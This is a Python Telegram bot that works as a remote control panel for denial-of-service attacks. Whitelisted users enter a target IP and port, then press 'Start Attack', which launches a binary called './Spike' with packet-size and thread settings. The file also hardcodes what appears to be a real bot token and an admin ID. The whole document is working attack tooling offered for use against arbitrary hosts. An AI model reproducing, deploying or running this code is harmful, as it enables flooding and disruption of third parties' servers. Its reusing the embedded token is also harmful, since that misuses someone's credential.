
import subprocess
import re
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters

# Configuration
TOKEN = "7378901925:AAFTtKgdkGnIpnJ6sv4Xryv2MT-RGd6M4Y8"  # Replace with your Telegram bot token
ADMIN_IDS = {6077036964}  # Replace with your actual admin user ID(s)

# Path to your binary
BINARY_PATH = "./Spike"

# Global variables
process = None
target_ip = None
target_port = None
packet_size = 200
threads = 200
users = set()  # Set to manage users in memory

# Validate IP address
def is_valid_ip(ip):
    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    return pattern.match(ip)

# Validate port number
def is_valid_port(port):
    return 1 <= port <= 65535

# Start command: Show Attack button
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id not in users:
        await update.message.reply_text("You are not authorized to use this bot. Please contact an admin.")
        return

    keyboard = [[KeyboardButton("Attack")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("Press the Attack button to start configuring the attack.", reply_markup=reply_markup)

# Handle the /add command to allow users
async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id in ADMIN_IDS:
        if len(context.args) > 0:
            new_user_id = int(context.args[0])
            users.add(new_user_id)
            await update.message.reply_text(f"User {new_user_id} added and granted access.")
        else:
            await update.message.reply_text("Please provide a user ID to add.")
    else:
        await update.message.reply_text("You are not authorized to add users.")

# Handle button clicks
async def attack_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Please provide the target IP and port in the format: <IP> <PORT>")

# Handle target and port input
async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global target_ip, target_port

    user_id = update.effective_user.id

    if user_id not in users:
        await update.message.reply_text("You are not authorized to use this bot.")
        return

    input_text = update.message.text.strip()

    try:
        target, port = input_text.split()
        target_ip = target.strip()
        target_port = int(port.strip())

        if not is_valid_ip(target_ip):
            await update.message.reply_text("Invalid IP address. Please enter a valid IP.")
            return
        
        if not is_valid_port(target_port):
            await update.message.reply_text("Port must be between 1 and 65535.")
            return
        
        keyboard = [
            [KeyboardButton("Start Attack"), KeyboardButton("Stop Attack")],
            [KeyboardButton("Reset")]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(f"Target: {target_ip}, Port: {target_port} configured.\n"
                                         "Now choose an action:", reply_markup=reply_markup)
    except ValueError:
        await update.message.reply_text("Invalid format. Please enter in the format: <IP> <PORT>")


# Start the attack
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process, target_ip, target_port
    user_id = update.effective_user.id

    if target_ip is None or target_port is None:
        await update.message.reply_text("Please configure the target and port first.")
        return

    if process and process.poll() is None:
        await update.message.reply_text("Attack is already running. Please stop it before starting a new one.")
        return

    try:
        process = subprocess.Popen([BINARY_PATH, target_ip, str(target_port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        await update.message.reply_text(f"🚀 Attack started on {target_ip}:{target_port}.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error starting attack: {e}")


# Stop the attack
async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process
    if process is None:
        await update.message.reply_text("No attack is currently running.")
        return

    try:
        process.terminate()  # Attempt to terminate the process
        process.wait(timeout=5)  # Wait a moment to allow the process to stop
        process = None  # Reset process to None after stopping
        await update.message.reply_text("🛑 Attack stopped successfully.")
    except subprocess.TimeoutExpired:
        process.kill()  # Force kill if it takes too long
        process = None
        await update.message.reply_text("❌ Attack did not stop in time, forcefully killed.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error stopping attack: {e}")

# Reset the attack settings
async def reset(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global target_ip, target_port
    target_ip = None
    target_port = None
    await update.message.reply_text("🔄 Attack settings reset. Please provide new target and port.")

# Main function to start the bot
def main():
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex('^Attack$'), attack_button))
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex('^Start Attack$'), start_attack))
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex('^Stop Attack$'), stop_attack))
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex('^Reset$'), reset))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_input))

    application.run_polling()

if __name__ == "__main__":
    main()
    